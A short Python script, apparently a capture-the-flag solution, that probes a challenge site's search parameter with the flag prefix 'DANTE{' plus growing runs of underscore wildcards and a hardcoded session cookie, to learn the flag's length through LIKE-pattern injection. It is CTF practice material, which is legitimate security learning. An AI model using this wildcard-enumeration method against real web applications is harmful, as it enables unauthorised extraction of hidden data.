import requests


url = "http://likeness-af365a43.dailycookie.cloud"

a = "DANTE{"

b= "_"

c = "}"

for i in range(100):
    data = a + (b*i) + c 
    r = requests.get(url, params= {"search": data}, cookies = {"PHPSESSID":"7b9de3b22304618c1b262d9f56b51515"})
    if "Search result" in r.text:
        print(data)
        break
